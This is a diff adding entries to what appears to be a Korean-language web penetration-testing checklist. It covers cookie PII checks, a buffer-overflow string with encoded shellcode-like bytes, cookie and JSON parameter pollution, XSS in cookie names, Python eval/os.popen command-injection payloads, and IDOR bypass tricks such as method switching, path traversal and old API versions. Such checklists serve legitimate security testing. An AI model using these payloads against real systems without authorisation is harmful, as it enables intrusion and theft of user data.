@@ -107,20 +107,74 @@
 50. 제품(일반적으로 일부 구독)을 구입하고 환불을 요청하여 해당 기능에 계속 액세스할 수 있는지 확인합니다.
 51. 여러 번의 환불을 받을 수 있는지 확인하기 위해 구독 취소(경주 조건)를 여러 번 요청해 보세요.
 52. 웹사이트에서 자바스크립트 코드를 보고 API키 / 토큰 찾기, 요청/응답 헤더를 확인하여 API키/토큰 찾기
+53. 쿠키에 저장된 anf pii 또는 기타 민감한 정보가 있는지 확인하세요. 여기에는 일반적으로 이메일, 세션 ID, 생년월일 데이터, 모바일 주소, ssn 등이 포함됩니다.
+54. 쿠키 길이 위반으로 인해 버퍼 오버플로가 발생합니다. 프로파일 길이보다 긴 쿠키 길이는 버퍼 오버플로 공격 시도를 나타낼 수 있습니다. 버퍼 오버플로 공격에서 공격자는 오버플로를 생성할 매우 긴 문자열을 보내야 하며, 이 문자열은 모두 이 위반을 생성합니다.
+55. 계정 생성시 이메일 길이를 256자가 초과하는 것으로 계정을 생성합니다.
+```
+NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
 
+NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
 
+NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
 
+NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531 b%u53ff%u0078%u0000%u00=a
+```
+56. 쿠키의 동일한 user_id 매개변수에 여러 사용자 ID를 주입
+57. 공격자, vuctim 사용자 ID가 다음과 같은 rhe 쿠키에 또 다른 **user_id=** 매개변수 값을 추가합니다: **user_id=atacker&user_id=victim**
+```
+- 애플리케이션은 피해자 데이터의 데이터를 검색할 수 있습니다.
+- 애플리케이션은 피해자 데이터와 공격자 데이터의 데이터를 검색할 수 있습니다
+```
+58. 쿠키를 제거하여 보호된 리소스에 액세스
+59. 쿠키 매개변수 이름에 xss코드 삽입
+60. 로그아웃 시 세션이 만료되지 않습니다. 뒤로가기 버튼으로 세션 재접속 
+61. **[ ] OS 명령 주입**
+```
+**eval(compile("""for x in range(1):\\n import os\\n os.popen(r'COMMAND').read()""",'','single'))**
+eval(compile("""__import__('os').popen(r'COMMAND').read()""",'','single'))
+**__import__('os').popen('COMMAND').read()**
+```
+62. **[ ] HTTP 메서드 변경**
+```
+GET /users/delete/victim_id  ->403
+POST /users/delete/victim_id ->200
+```
+63. [ ] 경로 횡단
+```
+POST /users/delete/victim_id          ->403
+POST /users/delete/my_id/..victim_id  ->200
+```
+64. [ ] 파일 형식 변경
+```
+GET /user_data/2341        -> 401
+GET /user_data/2341.json   -> 200
+GET /user_data/2341.xml    -> 200
+GET /user_data/2341.config -> 200
+GET /user_data/2341.txt    -> 200
+```
 
+65. [ ] json 매개변수 오염
+```
+{"userid":1234,"userid":2542}
+```
 
+66. [ ] 본문에서 배열로 ID를 감습니다.
+```
+{"userid":123} ->401
+{"userid":[123]} ->200
+```
 
+67. [ ] json 객체로 ID를 감습니다.
+```
+{"userid":123} ->401
+{"userid":{"userid":123}} ->200
+```
 
-
-
-
-
-
-
-
+68. [ ] outdata API 버전 테스트
+```
+GET /v3/users_data/1234 ->401
+GET /v1/users_data/1234 ->200
+```
 
 
 
